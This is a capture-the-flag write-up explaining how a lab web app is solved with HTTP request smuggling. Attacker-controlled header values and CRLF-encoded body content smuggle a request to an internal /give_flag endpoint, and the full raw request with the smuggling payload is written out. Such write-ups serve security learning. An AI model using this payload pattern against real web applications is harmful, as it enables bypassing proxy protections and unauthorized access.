Let's start by reading the provided code. We can immediately see an SQL injection vulnerability.
![](stuffy1.png)
However, we don't have control over the username. It's chosen from the provided `usernames.txt` file, which is a list of random usernames + 4 random characters.
![](stuffy2.png)

So, SQLi isn't the right path.

Among all the routes, we can notice the endpoint `/give_flag`.
![](stuffy3.png)
This function updates the value of "stuff" with the flag value for a user from the moment the request comes from the server itself.
We can try adding the Headers manually, but it won't work because it's the nginx proxy that modifies the headers.
So, we need to find a function that makes a request and redirect it to `/give_flag`.
Fortunately, `/set_stuff` makes a request to `/update_profile_internal`.

![](stuffy4.png)
Set_stuff first retrieves our username from the cookies and checks that this user exists.
Then it retrieves the stuff variable from the request and verifies that its length is less than 200.
The `special_type` and `special_val` variables are similarly retrieved and cleaned with the `security_filter` function.
`special_type` and `special_val` become Headers, and `stuff` becomes part of the body.

So, we have control over three variables: stuff, special_val, and special_type.
The most likely path is a request smuggling. Let's try.
```
POST /set_stuff HTTP/1.1
Host: localhost:3000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 228
Origin: http://localhost:3000
DNT: 1
Connection: close
Referer: http://localhost:3000/
Cookie: username=love1987OBCj
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
X-PwnFox-Color: blue

special_type=Content-Length&special_val=80&stuff=aaaaaab%0d%0a%0d%0aPOST /give_flag HTTP/1.1%0d%0aHost: 127.0.0.1:3000%0d%0aContent-Type: application/x-www-form-urlencoded%0d%0aContent-Length: 21%0d%0a%0d%0ausername=love1987OBCj
```

Here, `special_type` and `special_val` form a header that will inform the first request (the end of aaaaaab) = Content-length: 80.
How do we find this number?

 ![](stuffy5.png)
We just need to find the size of this string.
![](stuffy6.png)
Then we create a second request. After refreshing the page, we'll have the flag in our stuff.
![](stuffy7.png)
That's it!
